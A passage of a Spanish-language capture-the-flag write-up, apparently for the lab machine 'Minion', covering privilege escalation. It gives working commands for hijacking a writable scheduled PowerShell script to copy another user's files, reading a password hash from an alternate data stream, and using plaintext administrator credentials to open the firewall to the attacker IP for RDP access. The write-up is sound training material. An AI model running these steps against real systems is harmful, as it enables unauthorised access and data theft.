## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

#### Secuestro de comandos para copiar los ficheros del usuario decoder.MINION {-}

```bash
dir c:\
dir c:\sysadmscripts
```

Vemos en `C:\` un directorio raro llamado `sysadmscript`. En este directorio, hay dos ficheros:

- c.ps1
- del_logs.bat

Analizando con el comando type lo que hacen estos script, vemos que el `del_logs.bat` llama al fichero `c.ps1` y lo
ejecuta con **powershell**. Aqui pensamos que hay una tarea que se ejecuta a intervalo regular de tiempo que ejecuta el fichero
`del_logs.bat`. Miramos si podemos modificar los ficheros.

```bash
cacls c:\sysadmscripts\del_logs.bat
cacls c:\sysadmscripts\c.ps1
```

Modificamos el Script para copiar los ficheros del usuario **decoder.Minion**

Aqui vemos que solo podemos modificar el fichero `c.ps1`

```bash
echo "dir C:\Users\decoder.MINION\Desktop\ > C:\Temp\decoder_desktop.txt" > C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\user.txt > C:\Temp\decoder_user.txt" >> C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\* > C:\Temp\" >> C:\Temp\c.ps1
copy C:\Temp\c.ps1 C:\sysadmscripts\c.ps1
```

Esperando un poco, nos copia los ficheros en `c:\temp`. Podemos visualizar la flag del usuario.
Tambien vemos un fichero `backup.zip` y si le chequeamos por **Aditionnal Data Streams** con el comando

#### Lectura de Additionnal Data Strems y crackeo de Hash {-}

```bash
Get-Item -Path C:\Temp\backup.zip -stream *
```

Vemos que tiene un stream llamado pass. Lo miramos con el comando `type`

```bash
type C:\Temp\backup.zip:pass
```

y encontramos un hash. Si lo pasamos por [crackstation](https://crackstation.net/) nos da la contraseña.

#### Ejecucion de comandos como administrator con ScriptBlock {-}

Aqui el problema es que no tenemos conectividad con **smb** o otros puertos para conectarnos como root. La idea
aqui seria de ejecutar comandos como administrator para cambiar la reglas del Firewall.

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}

#Output
minion\administrator
```

Aqui vemos que podemos ejecutar comando como el usuario administrator. Vamos a por el cambio en el firewall

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
{New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}

#Output
minion\administrator
```

Si ahora desde la maquina de atacante le hacemos un nmap para ver los puertos abiertos

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.57
```

vemos que tenemos todo expuesto y como hay el puerto 3389 que es el puerto **RDP** ya nos podemos conectar con Remmina por ejemplo.

```{r, echo = FALSE, fig.cap="minion remmina connection", out.width="90%"}
knitr::include_graphics("images/minion-remina.png")
```

Y ya estamos en la maquina como administrator

```{r, echo = FALSE, fig.cap="minion remmina pwned", out.width="90%"}
knitr::include_graphics("images/minion-pwned.png")
```